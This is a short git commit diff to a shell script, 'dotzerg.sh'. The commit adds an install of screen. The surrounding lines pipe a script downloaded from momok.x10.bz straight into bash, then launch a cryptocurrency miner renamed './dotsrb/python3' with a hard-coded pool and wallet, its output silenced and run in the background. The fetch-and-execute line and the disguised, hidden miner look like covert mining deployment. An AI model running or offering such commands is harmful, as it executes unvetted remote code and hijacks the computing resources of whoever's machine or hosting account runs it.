c6452516dc67070cbecfac27e7d38365a1909398
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-16 00:17:53 +0700

    Update dotzerg.sh

--- dotzerg.sh
+++ dotzerg.sh
@@ -1,3 +1,5 @@
+apt install screen -y
+
 bash -c "$(wget -qO- momok.x10.bz/Alat-Coli-SRB.sh)"
 
 screen ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
